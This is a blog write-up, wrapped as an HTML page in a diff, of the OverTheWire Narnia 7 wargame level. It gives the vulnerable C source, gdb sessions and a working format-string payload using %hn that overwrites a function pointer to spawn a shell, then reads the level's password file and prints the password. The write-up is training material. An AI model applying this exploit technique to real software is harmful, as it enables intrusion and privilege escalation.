@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Narnia 7 - OverTheWire - Omer&#39;s Blog</title><meta name="Description" content="This my personal blog where I write about Tech"><meta property="og:title" content="Narnia 7 - OverTheWire" />
+<meta property="og:description" content="Narnia 7 - OverTheWire Intro This level is kind of a combination of the previous two Levels. You have to overwrite a function pointer, but you have to do it using a format string vulnerability there is no overflowing this time.
+Now Let&rsquo;s run the program see what it does.
+narnia7@narnia:/narnia$ ./narnia7 Usage: ./narnia7 &lt;buffer&gt; narnia7@narnia:/narnia$ The program asks us for an input.
+narnia7@narnia:/narnia$ ./narnia7 AAAA goodfunction() = 0x80486ff hackedfunction() = 0x8048724 before : ptrf() = 0x80486ff (0xffffd628) I guess you want to come to the hackedfunction." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://omer-biz.github.io/posts/narnia-7-overthewire/" /><meta property="og:image" content="https://omer-biz.github.io/posts/narnia-7-overthewire/featured-image.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-21T22:08:02&#43;03:00" />
+<meta property="article:modified_time" content="2021-04-21T22:08:02&#43;03:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://omer-biz.github.io/posts/narnia-7-overthewire/featured-image.jpg"/>
+<meta name="twitter:title" content="Narnia 7 - OverTheWire"/>
+<meta name="twitter:description" content="Narnia 7 - OverTheWire Intro This level is kind of a combination of the previous two Levels. You have to overwrite a function pointer, but you have to do it using a format string vulnerability there is no overflowing this time.
+Now Let&rsquo;s run the program see what it does.
+narnia7@narnia:/narnia$ ./narnia7 Usage: ./narnia7 &lt;buffer&gt; narnia7@narnia:/narnia$ The program asks us for an input.
+narnia7@narnia:/narnia$ ./narnia7 AAAA goodfunction() = 0x80486ff hackedfunction() = 0x8048724 before : ptrf() = 0x80486ff (0xffffd628) I guess you want to come to the hackedfunction."/>
+<meta name="application-name" content="Th3Librarin">
+<meta name="apple-mobile-web-app-title" content="Th3Librarin"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://omer-biz.github.io/posts/narnia-7-overthewire/" /><link rel="prev" href="https://omer-biz.github.io/posts/narnia-6-overthewire/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Narnia 7 - OverTheWire",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/omer-biz.github.io\/posts\/narnia-7-overthewire\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/omer-biz.github.io\/posts\/narnia-7-overthewire\/featured-image.jpg",
+                            "width":  1600 ,
+                            "height":  840 
+                        }],"genre": "posts","keywords": "narnia, overthewire, binary_exploitation, exploitation, ctf, wargame","wordcount":  1373 ,
+        "url": "https:\/\/omer-biz.github.io\/posts\/narnia-7-overthewire\/","datePublished": "2021-04-21T22:08:02+03:00","dateModified": "2021-04-21T22:08:02+03:00","publisher": {
+            "@type": "Organization",
+            "name": "Omer"},"author": {
+                "@type": "Person",
+                "name": "Omer"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Omer&#39;s Blog">Th3Librarin</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Home Page"> Home </a><a class="menu-item" href="/posts/" title="Blog Posts"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about" title="About"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Omer&#39;s Blog">Th3Librarin</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Home Page">Home</a><a class="menu-item" href="/posts/" title="Blog Posts">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="About">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Narnia 7 - OverTheWire</h1><h2 class="single-subtitle">Overwriting using format string vulnerabilities</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Omer</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-04-21">2021-04-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1373 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/narnia-7-overthewire/featured-image.jpg"
+        data-srcset="/posts/narnia-7-overthewire/featured-image.jpg, /posts/narnia-7-overthewire/featured-image.jpg 1.5x, /posts/narnia-7-overthewire/featured-image.jpg 2x"
+        data-sizes="auto"
+        alt="/posts/narnia-7-overthewire/featured-image.jpg"
+        title="/posts/narnia-7-overthewire/featured-image.jpg" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#analysis">Analysis</a></li>
+    <li><a href="#exploiting">Exploiting</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="narnia-7---overthewire">Narnia 7 - OverTheWire</h1>
+<h2 id="intro">Intro</h2>
+<p>This level is kind of a combination of the previous two Levels. You have to overwrite a function
+pointer, but you have to do it using a format string vulnerability there is no overflowing
+this time.</p>
+<p>Now Let&rsquo;s run the program see what it does.</p>
+<pre><code>narnia7@narnia:/narnia$ ./narnia7
+Usage: ./narnia7 &lt;buffer&gt;
+narnia7@narnia:/narnia$
+</code></pre><p>The program asks us for an input.</p>
+<pre><code>narnia7@narnia:/narnia$ ./narnia7 AAAA
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd628)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+narnia7@narnia:/narnia$
+</code></pre><p>After we give it our input it prints the address of two function, and the address of a
+pointer pointing to one of the functions, <code>goodfunction</code>. But our input is not being
+reflected which means we can not debug our input properly.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
+<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>
+
+<span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>
+
+        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;goodfunction() = %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>
+
+        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
+
+        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Way to go!!!!&#34;</span><span class="p">);</span>
+        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="analysis">Analysis</h2>
+<p>The <code>main</code> function calls <code>vuln</code> with the <code>argv[1]</code>, which is the input we supplied, and the
+<code>vuln</code> function copies it to a stack buffer by using the <code>snprintf</code> function which limits
+our input size but in the wrong way. Since our input is being passed as a format parameter
+we can exploit this. The <code>vuln</code> function also copies the address of <code>goodfunction</code> to the
+<code>ptrf</code> pointer and calls it. There is also the <code>hackedfunction</code> which if we manage to call
+it will spawn a shell for us.</p>
+<p>If we can overwrite what is on the <code>ptrf</code> pointer with the address of the <code>hackedfunction</code>
+we can get a shell.</p>
+<p>We are a bit unlucky this time we don&rsquo;t have our input printed back to us which means we will
+have to use <code>gdb</code> to debug the program.</p>
+<p>First I want to know which parameter overflows to our string. To do that I try to print what
+ever the <code>%s</code> format parameter can find, and if it finds my input it will try to dereference
+<code>0x41414141</code> which I think is not a valid address and the program will crash.</p>
+<p>First try</p>
+<pre><code>narnia7@narnia:/narnia$ ./narnia7 &quot;AAAA%s&quot;
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd618)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+narnia7@narnia:/narnia$
+</code></pre><p>The program didn&rsquo;t crash second try.</p>
+<pre><code>narnia7@narnia:/narnia$ ./narnia7 &quot;AAAA%x%s&quot;
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd618)
+I guess you want to come to the hackedfunction...
+Segmentation fault
+narnia7@narnia:/narnia$
+</code></pre><p>Yes, the program crashed which means the second format parameter is where our program starts
+to read from. We can confirm this with <code>gdb</code>.</p>
+<p>To confirm this what we are going to do is, try to overwrite the <code>ptrf</code> function and see if
+the program crash.</p>
+<p>Fist let&rsquo;s set a break point after the <code>snprintf</code> function and inspect the stack. I will
+also run the program without any format parameters in the beginning to get the address of <code>ptrf</code>.</p>
+<pre><code>(gdb) run AAAA
+Starting program: /narnia/narnia7 AAAA
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd5f8)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x080486b2 in vuln ()
+</code></pre><p>Now that we have the address of <code>ptrf</code> let&rsquo;s try to overwrite.</p>
+<pre><code>(gdb) run &quot;$(echo -en &quot;\xf8\xd5\xff\xff&quot;)%08x%n&quot;
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia7 &quot;$(echo -en &quot;\xf8\xd5\xff\xff&quot;)%08x%n&quot;
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd5f8)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x080486b2 in vuln ()
+(gdb) x/wx 0xffffd5f8
+0xffffd5f8:     0x0000000c
+</code></pre><p>Yes overwritten and if we try to continue the execution we get a segfult.</p>
+<pre><code>(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000c in ?? ()
+(gdb)
+</code></pre><h2 id="exploiting">Exploiting</h2>
+<p>Now for the next part we don&rsquo;t need to overwrite each byte, or write 2 half words. If you look
+closely to the two functions <code>goodfunction</code> and <code>hackedfunction</code> both share the same value
+in the first half i.e. they both have <code>0x0804</code> in the first part of their address we just
+have to overwrite the second half and we are done.</p>
+<p>In format strings when you use the <code>%n</code> it writes <code>4</code> bytes to the address given to it. But
+there are length modifiers which can specify how much bytes to write. From the manpage.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-md" data-lang="md">...
+Length modifier
+   Here, &#34;integer conversion&#34; stands for d, i, o, u, x, or X conversion.
+
+   hh     A following integer conversion corresponds to a signed char or unsigned char ar‐
+          gument,  or  a  following n conversion corresponds to a pointer to a signed char
+          argument.
+
+   h      A following integer conversion corresponds to a short or  unsigned  short  argu‐
+          ment, or a following n conversion corresponds to a pointer to a short argument.
+
+   l      (ell)  A following integer conversion corresponds to a long or unsigned long ar‐
+          gument, or a following n conversion corresponds to a pointer to a long argument,
+          or  a  following c conversion corresponds to a wint_t argument, or a following s
+          conversion corresponds to a pointer to wchar_t argument.
+
+   ll     (ell-ell).  A following integer conversion corresponds to a  long  long  or  un‐
+          signed  long long argument, or a following n conversion corresponds to a pointer
+          to a long long argument.
+
+   q      A synonym for ll.  This is a nonstandard extension, derived from BSD; avoid  its
+          use in new code.
+...
+</code></pre></td></tr></table>
+</div>
+</div><p>We are going to use <code>h</code> which states that the integer conversion will be <code>short</code> or <code>unsigned short</code>
+and a <code>short</code> is 2-bytes, it actually depends on each system but in our case it&rsquo;s 2-bytes.
+Let&rsquo;s test it out.</p>
+<pre><code>(gdb) run $(echo -en &quot;\x28\xd6\xff\xff&quot;)%08x%hn
+Starting program: /narnia/narnia7 $(echo -en &quot;\x28\xd6\xff\xff&quot;)%08x%hn
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd628)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x080486b2 in vuln ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804000c in ?? ()
+</code></pre><p>It works now it&rsquo;s just a matter of writing the right address and we are done. We want the other
+half to be <code>0x8724</code> which is <code>34596</code> in decimal, but we have already written <code>0x000c</code> which
+means we have to account for it by subtracting it <code>0x8724 - 0x000c</code> we also have to add
+<code>8</code> in decimal because of the <code>%08</code>, and finally we have <code>0x8724 - 0x000c + 8 = 34592</code> . Let&rsquo;s
+try it out.</p>
+<pre><code>(gdb) run $(echo -en &quot;\x18\xd6\xff\xff&quot;)%34592x%hn
+Starting program: /narnia/narnia7 $(echo -en &quot;\x18\xd6\xff\xff&quot;)%34592x%hn
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd618)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x080486b2 in vuln ()
+</code></pre><p>Seems like it worked let&rsquo;s examine what&rsquo;s on <code>ptrf</code></p>
+<pre><code>(gdb) x/wx 0xffffd618
+0xffffd618:     0x08048724
+</code></pre><p>The address of <code>hackedfunction</code> has been written successfully. If we continue the execution
+we should get a shell and indeed we get a shell.</p>
+<pre><code>(gdb) c
+Continuing.
+Way to go!!!!$
+$
+</code></pre><p>Now let&rsquo;s try it outside of <code>gdb</code>.</p>
+<pre><code>narnia7@narnia:/narnia$ ./narnia7 $(echo -en &quot;\x58\xd6\xff\xff&quot;)%34592x%hn
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd658)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
+$
+</code></pre><p>Running it the first time nothing happened, because the address have chagned
+I just changed the address and it worked.</p>
+<p>And as always thanks for reading :)</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-04-21</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://omer-biz.github.io/posts/narnia-7-overthewire/" data-title="Narnia 7 - OverTheWire" data-via="_th4tk1d" data-hashtags="narnia,overthewire,binary_exploitation,exploitation,ctf,wargame"><i class="fab fa-twitter fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/narnia/">narnia</a>,&nbsp;<a href="/tags/overthewire/">overthewire</a>,&nbsp;<a href="/tags/binary_exploitation/">binary_exploitation</a>,&nbsp;<a href="/tags/exploitation/">exploitation</a>,&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/wargame/">wargame</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/narnia-6-overthewire/" class="prev" rel="prev" title="Narnia 6 - OverTheWire"><i class="fas fa-angle-left fa-fw"></i>Narnia 6 - OverTheWire</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.81.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
